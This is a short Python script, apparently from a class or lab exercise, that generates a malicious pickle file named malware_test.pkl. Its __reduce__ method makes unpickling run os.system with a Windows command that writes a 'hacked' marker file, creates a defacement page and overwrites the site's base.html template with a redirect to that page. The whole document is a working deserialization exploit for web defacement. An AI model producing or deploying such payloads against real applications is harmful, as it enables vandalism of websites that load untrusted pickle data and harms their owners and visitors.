import pickle
import os

class AtaqueVisual:
    def __reduce__(self):
        cmd = (
            "echo HACKED_BY_GROUP5 > HACKED_BY_GROUP5.txt && "
            "echo ^<html^>^<head^>^<title^>Hackeada^</title^>^</head^>^<body^>^<h1^>ðŸ’€ PÃ¡gina hackeada ðŸ’€^</h1^>^</body^>^</html^> > static\\pwned.html && "
            "echo ^<meta http-equiv=\"refresh\" content=\"0; URL=/static/pwned.html\"^> > templates\\base.html && "
            "echo OK > debug_malware.log"
        )
        return (os.system, (cmd,))


# Guardar como malware_test.pkl
with open('malware_test.pkl', 'wb') as f:
    pickle.dump(AtaqueVisual(), f)

print("[âœ”] malware_test.pkl generado correctamente.")